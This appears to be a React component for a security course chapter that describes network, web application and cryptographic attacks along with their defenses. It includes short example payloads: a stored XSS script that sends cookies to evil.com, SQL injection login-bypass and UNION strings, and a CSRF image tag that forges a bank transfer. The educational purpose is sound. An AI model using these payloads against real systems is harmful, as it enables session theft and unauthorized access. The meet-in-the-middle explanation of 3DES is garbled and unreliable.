import React from "react";

export const Ch6Content = () => {
  return (
    <div className="course-content">
      <p className="p-text">
        Understanding how attacks work in detail is the foundation of defending against them. This chapter covers every major network, application, and cryptographic attack — with mechanisms, real-world examples, and concrete defenses.
      </p>

      <section>
        <h3 className="section-heading">Network-Level Attacks</h3>

        <div className="card mt-4">
          <h4 className="font-bold text-xl mb-3 text-[#5b3a29]">DoS (Denial of Service)</h4>
          <ul className="section-list space-y-2">
            <li><strong>Goal:</strong> Make a service unavailable to legitimate users by exhausting its resources (bandwidth, CPU, memory, connections).</li>
            <li><strong>SYN Flood:</strong> Attacker sends thousands of TCP SYN packets with spoofed source IPs. Server allocates resources and sends SYN-ACK for each, waits for ACK that never comes. Half-open connections fill the state table → server cannot accept new legitimate connections. Defense: SYN cookies (server encodes state in the SYN-ACK sequence number, allocates no resources until ACK is received).</li>
            <li><strong>HTTP Flood:</strong> Legitimate-looking HTTP GET/POST requests at high volume. Hard to distinguish from real traffic. Defense: rate limiting per IP, CAPTCHA, WAF behavioral analysis.</li>
            <li><strong>Ping of Death:</strong> Sending an oversized ping packet (over 65535 bytes after reassembly) that crashes older systems. Patched in modern OSes.</li>
            <li><strong>Smurf Attack:</strong> Attacker sends ICMP echo request to a network's broadcast address with spoofed source IP (victim's IP). Every host replies to the victim. Defense: disable directed broadcast on routers.</li>
          </ul>
        </div>

        <div className="card mt-4">
          <h4 className="font-bold text-xl mb-3 text-[#5b3a29]">DDoS (Distributed Denial of Service)</h4>
          <ul className="section-list space-y-2">
            <li>Same as DoS but attack traffic comes from thousands or millions of compromised machines (a botnet).</li>
            <li><strong>Botnet:</strong> Network of compromised computers (zombies) controlled by the attacker via a command-and-control (C2) server. Victims' machines are infected with malware. They attack on command.</li>
            <li><strong>Amplification attacks:</strong> Attacker sends a small request to servers (DNS, NTP, memcached) with the victim's IP spoofed as source. Servers send large responses to the victim. DNS amplification: 40-byte query → 4000-byte response = 100x amplification. Memcached amplification: up to 51,000x amplification.</li>
            <li><strong>Defense:</strong> Traffic scrubbing centers (Cloudflare, Akamai) absorb attack traffic. Anycast routing distributes traffic across many data centers. Rate limiting, BGP blackholing. BCP38 (network ingress filtering) prevents IP spoofing at ISP level.</li>
          </ul>
        </div>

        <div className="card mt-4">
          <h4 className="font-bold text-xl mb-3 text-[#5b3a29]">Man-in-the-Middle (MITM) Attack</h4>
          <ul className="section-list space-y-2">
            <li>Attacker secretly intercepts communication between two parties, possibly reading and altering messages. Both parties believe they are communicating directly with each other.</li>
            <li><strong>SSL Stripping:</strong> Attacker intercepts an HTTP connection before HTTPS redirect. Client sees HTTP, attacker connects to server via HTTPS. Client sends credentials in plaintext to attacker. Defense: HSTS (forces HTTPS even before redirect).</li>
            <li><strong>Rogue AP (Evil Twin):</strong> Attacker sets up a Wi-Fi access point with the same SSID as a legitimate network. Clients connect to the rogue AP instead. All traffic passes through attacker. Defense: Always use VPN on public Wi-Fi. 802.1X enterprise Wi-Fi authentication.</li>
            <li><strong>BGP Hijacking:</strong> Attacker announces false BGP routes, rerouting internet traffic through their AS (Autonomous System). Used for large-scale traffic interception. Defense: BGP Route Origin Validation (ROV) using RPKI.</li>
            <li><strong>Defense against MITM:</strong> TLS with proper certificate validation. Certificate pinning (embed expected certificate in app). HSTS. Mutual TLS (mTLS) where both sides authenticate.</li>
          </ul>
        </div>

        <div className="card mt-4">
          <h4 className="font-bold text-xl mb-3 text-[#5b3a29]">Replay Attack</h4>
          <ul className="section-list space-y-2">
            <li>Attacker captures a valid data transmission (authentication token, signed message, command) and re-transmits it later to achieve the same effect as the original sender.</li>
            <li><strong>Example:</strong> Attacker captures a bank's "transfer £1000" request (even if it's encrypted). Replays it 10 times → 10 transfers. The bank can't tell it's a replay.</li>
            <li><strong>Another example:</strong> Wireless car key fob signals captured and replayed to unlock the car.</li>
            <li><strong>Defenses:</strong> Timestamps — reject any message older than a few seconds. Nonces — server issues a one-time random number; client must include it in the response. Server marks used nonces. Sequence numbers — each message has a unique incrementing number; reject duplicates. All three used in Kerberos and TLS.</li>
          </ul>
        </div>

        <div className="card mt-4">
          <h4 className="font-bold text-xl mb-3 text-[#5b3a29]">ARP Spoofing / ARP Poisoning</h4>
          <ul className="section-list space-y-2">
            <li>ARP (Address Resolution Protocol) resolves IP addresses to MAC addresses on a local network. It has no authentication — anyone can send ARP replies.</li>
            <li><strong>Attack:</strong> Attacker broadcasts fake ARP replies: "IP 192.168.1.1 is at MAC AA:BB:CC:DD:EE:FF" (attacker's MAC). All hosts update their ARP cache. Now traffic meant for the gateway goes to the attacker instead — classic MITM on a LAN.</li>
            <li><strong>Real-world tool:</strong> arpspoof, Ettercap, Bettercap.</li>
            <li><strong>Defenses:</strong> Dynamic ARP Inspection (DAI) on managed switches — validates ARP packets against a DHCP snooping table. Static ARP entries for critical hosts. 802.1X port authentication. VPN (encrypted traffic is still encrypted even if intercepted).</li>
          </ul>
        </div>

        <div className="card mt-4">
          <h4 className="font-bold text-xl mb-3 text-[#5b3a29]">DNS Spoofing / Cache Poisoning</h4>
          <ul className="section-list space-y-2">
            <li>DNS resolves domain names to IP addresses. If an attacker can insert a false record into a DNS resolver's cache, all clients using that resolver are redirected to the attacker's IP.</li>
            <li><strong>Kaminsky Attack (2008):</strong> By sending many spoofed DNS responses with different transaction IDs, an attacker could poison a DNS cache without being on the path between client and DNS server. Affected essentially every DNS implementation. Patched by randomizing source ports and using random transaction IDs.</li>
            <li><strong>Defenses:</strong> DNSSEC — DNS records are digitally signed. Resolvers verify signatures. DNS over HTTPS (DoH) / DNS over TLS (DoT) — encrypts DNS queries, preventing interception and modification. Prevents passive surveillance of DNS queries too.</li>
          </ul>
        </div>
      </section>

      <section className="mt-8">
        <h3 className="section-heading">Application-Level Attacks</h3>

        <div className="card mt-4">
          <h4 className="font-bold text-xl mb-3 text-[#5b3a29]">SQL Injection (SQLi)</h4>
          <ul className="section-list space-y-2">
            <li>Attacker inserts malicious SQL code into user input fields, which is then executed by the database as part of a query.</li>
            <li><strong>Classic example:</strong> Login form. Intended query: SELECT * FROM users WHERE username='alice' AND password='password'. Attacker enters username: ' OR '1'='1' --. Query becomes: SELECT * FROM users WHERE username='' OR '1'='1' --' AND password=''. '1'='1' is always true, -- comments out the password check. Attacker logs in as any user.</li>
            <li><strong>UNION attack:</strong> ' UNION SELECT username, password FROM admins -- → dumps admin credentials into the response.</li>
            <li><strong>Blind SQLi:</strong> No output is returned but attacker infers database contents from timing differences (time-based) or boolean responses (content-based).</li>
            <li><strong>Defenses:</strong> Parameterized queries (prepared statements) — the query and data are sent to the database separately; user input can never be interpreted as SQL. Input validation and whitelisting. Least-privilege database accounts — web app DB user should not have DROP/DELETE privileges. WAF as additional layer. Stored procedures (if parameterized).</li>
          </ul>
        </div>

        <div className="card mt-4">
          <h4 className="font-bold text-xl mb-3 text-[#5b3a29]">XSS (Cross-Site Scripting)</h4>
          <ul className="section-list space-y-2">
            <li>Attacker injects malicious JavaScript into a web page that is then executed in other users' browsers. The victim's browser runs the script in the context of the trusted website.</li>
            <li><strong>Stored (Persistent) XSS:</strong> Malicious script is stored on the server (e.g. in a comment or forum post) and served to all visitors. Most dangerous type. Example: Attacker posts a comment containing &lt;script&gt;document.location='https://evil.com/?c='+document.cookie&lt;/script&gt;. Every user who views the page sends their session cookie to the attacker.</li>
            <li><strong>Reflected XSS:</strong> Malicious script is embedded in a URL. Server reflects it back in the response. Victim must be tricked into clicking the malicious link. Example: https://bank.com/search?q=&lt;script&gt;...&lt;/script&gt;.</li>
            <li><strong>DOM-based XSS:</strong> Client-side JavaScript reads from the URL (e.g. document.location) and writes it to the page unsanitized. Never touches the server.</li>
            <li><strong>What attackers can do with XSS:</strong> Steal session cookies → hijack accounts. Redirect to phishing pages. Log keystrokes. Perform actions as the victim. Spread worm-like to other users (stored XSS).</li>
            <li><strong>Defenses:</strong> Output encoding — encode all user-supplied content before inserting into HTML (&lt; → &amp;lt; etc.). Content Security Policy (CSP) header — tells browser which scripts are allowed to execute; blocks inline scripts. HttpOnly cookie flag — prevents JavaScript from accessing session cookies. Input validation and sanitization. Avoid innerHTML — use textContent instead.</li>
          </ul>
        </div>

        <div className="card mt-4">
          <h4 className="font-bold text-xl mb-3 text-[#5b3a29]">CSRF (Cross-Site Request Forgery)</h4>
          <ul className="section-list space-y-2">
            <li>Attacker tricks a logged-in victim's browser into sending an unwanted request to a web application where the victim is authenticated. The server sees the request with the victim's valid session cookie and processes it.</li>
            <li><strong>Example:</strong> Victim is logged into their bank (session cookie auto-sent). Attacker sends a phishing email with a link to evil.com. evil.com contains: &lt;img src="https://bank.com/transfer?to=attacker&amount=1000"&gt;. When victim loads evil.com, browser automatically sends the GET request to bank.com with the session cookie. Bank processes the transfer.</li>
            <li><strong>Why it works:</strong> Browsers automatically include cookies for a domain in every request to that domain, regardless of which page initiated the request.</li>
            <li><strong>Defenses:</strong> CSRF tokens — server generates a random unpredictable token, embeds it in every form, verifies it on submission. Attacker on evil.com cannot read the CSRF token from bank.com (same-origin policy). SameSite cookie attribute — SameSite=Strict: cookie only sent for same-site requests. SameSite=Lax: sent for top-level navigations only. Effectively prevents CSRF. Origin/Referer header check — server rejects requests whose Origin/Referer header doesn't match the expected domain.</li>
          </ul>
        </div>
      </section>

      <section className="mt-8">
        <h3 className="section-heading">Cryptographic Attacks</h3>

        <div className="card mt-4">
          <ul className="section-list space-y-2">
            <li><strong>Brute Force:</strong> Systematically try every possible key or password. Against AES-256: 2²⁵⁶ attempts needed — infeasible for millions of years. Against a 6-character alphanumeric password: 62⁶ ≈ 57 billion — cracked in seconds by a modern GPU. Defense: large key sizes (128+ bits), account lockout and rate limiting for passwords.</li>
            <li><strong>Dictionary Attack:</strong> Try words from a list of common passwords instead of all possible combinations. Most users choose predictable passwords ("password123", "qwerty"). Defense: salted password hashing (Argon2, bcrypt) makes precomputed dictionaries useless. Each password has a unique salt.</li>
            <li><strong>Rainbow Table Attack:</strong> Precompute a hash-to-password mapping for all common passwords. Look up hash instantly instead of computing. Against unsalted MD5 hashes, an entire dictionary can be reversed in milliseconds. Defense: salting. A salt makes precomputed tables useless because you'd need a separate table for every possible salt value.</li>
            <li><strong>Birthday Attack:</strong> Uses the birthday paradox to find hash collisions faster. For an n-bit hash, finding a collision takes only 2^(n/2) attempts instead of 2^n. For MD5 (128-bit), only 2⁶⁴ attempts needed for a collision — feasible. Defense: use hash outputs ≥ 256 bits.</li>
            <li><strong>Side-Channel Attack:</strong> Exploits physical implementation characteristics rather than mathematical weaknesses. Timing attack: measure decryption time — different operations take different times, revealing key bits. Power analysis: measure power consumption during crypto operations — correlates with intermediate key values (used against smart cards and HSMs). Acoustic cryptanalysis: microphone picks up computer sounds during RSA decryption. Defense: constant-time implementations, power analysis countermeasures in hardware.</li>
            <li><strong>Padding Oracle Attack:</strong> If a server reveals (via different error messages or timing) whether decrypted ciphertext has valid padding (e.g. PKCS#7), an attacker can decrypt arbitrary ciphertext byte by byte without the key. Broke CBC mode in TLS (POODLE, BEAST attacks). Defense: always use AEAD modes (AES-GCM) — no separate MAC, no padding oracle. In TLS 1.3, this is enforced.</li>
            <li><strong>Meet-in-the-Middle Attack:</strong> Against double encryption (encrypt twice with two different keys). Instead of 2^(2k) brute force effort, attacker can do it in 2^(k+1) using a table. Why Triple-DES uses 3 keys — 2-key 3DES is only 2^112 secure (not 2^112 due to MITM reducing it from 2^112 somewhat). Defense: use enough key bits that MITM is still infeasible.</li>
          </ul>
        </div>
      </section>

      <section className="mt-8">
        <h3 className="section-heading">General Security Principles</h3>
        <div className="card mt-4">
          <ul className="section-list space-y-2">
            <li><strong>Defense in Depth:</strong> Use multiple overlapping security layers. If one fails, others compensate. Example: Firewall + IDS + Application WAF + Input validation + Encryption + Logging. An attacker must defeat all layers. No single point of failure.</li>
            <li><strong>Principle of Least Privilege:</strong> Every user, process, and system should have the minimum access rights needed for their function. A web server process should not run as root. A database user for a read-only report should only have SELECT privilege. An intern should not have admin rights. Limits damage from compromise.</li>
            <li><strong>MFA (Multi-Factor Authentication):</strong> Require at least two of: Something you know (password, PIN). Something you have (phone app, hardware token, smart card). Something you are (fingerprint, face, iris). Greatly reduces account compromise even if password is stolen. Phishing-resistant MFA: hardware security keys (FIDO2/WebAuthn) cannot be phished — the key verifies the domain before signing.</li>
            <li><strong>Patch Management:</strong> 60% of breaches exploit known vulnerabilities with available patches. Keep OS, applications, firmware updated. Use a systematic process: vulnerability scanning → prioritize critical patches → test → deploy → verify. Emergency patching process for critical zero-days.</li>
            <li><strong>Zero Trust Architecture:</strong> "Never trust, always verify." Assume no user or device is trustworthy by default, even inside the network. Every access request must be authenticated and authorized. Replaces the traditional perimeter model ("trusted inside, untrusted outside") which fails when the perimeter is breached.</li>
            <li><strong>Separation of Duties:</strong> No single person should control an entire sensitive process. Example: in banking, the person who authorizes a transaction should not be the person who executes it. Prevents insider fraud.</li>
            <li><strong>Security by Obscurity (avoid as sole defense):</strong> Hiding system details (secret algorithm, hidden port) provides weak security. Attackers can discover it. Never rely solely on obscurity. It can be a small additional layer, but must not be the primary control.</li>
          </ul>
        </div>
      </section>

      <section className="mt-8">
        <h3 className="section-heading">Key Points to Remember</h3>
        <div className="card mt-4">
          <ul className="section-list space-y-2">
            <li>SYN flood = half-open connection exhaustion. Defense: SYN cookies.</li>
            <li>DDoS uses botnets. Amplification attacks spoof victim IP to get servers to flood it.</li>
            <li>MITM = intercept + possibly alter. Defense: TLS + certificate validation + HSTS.</li>
            <li>Replay = reuse valid transmission. Defense: timestamps + nonces + sequence numbers.</li>
            <li>ARP spoofing = fake ARP replies on LAN → MITM. Defense: Dynamic ARP Inspection.</li>
            <li>DNS cache poisoning = fake DNS → redirect to malicious IP. Defense: DNSSEC, DoH/DoT.</li>
            <li>SQLi = input interpreted as SQL. Defense: parameterized queries (prepared statements).</li>
            <li>XSS = injected JS runs in victim's browser. Defense: output encoding + CSP + HttpOnly.</li>
            <li>CSRF = browser auto-sends cookies to tricked request. Defense: CSRF tokens + SameSite.</li>
            <li>Side-channel = physical measurement leaks key. Defense: constant-time algorithms.</li>
            <li>Defense in Depth + Least Privilege + MFA are the three most important security principles.</li>
          </ul>
        </div>
      </section>
    </div>
  );
};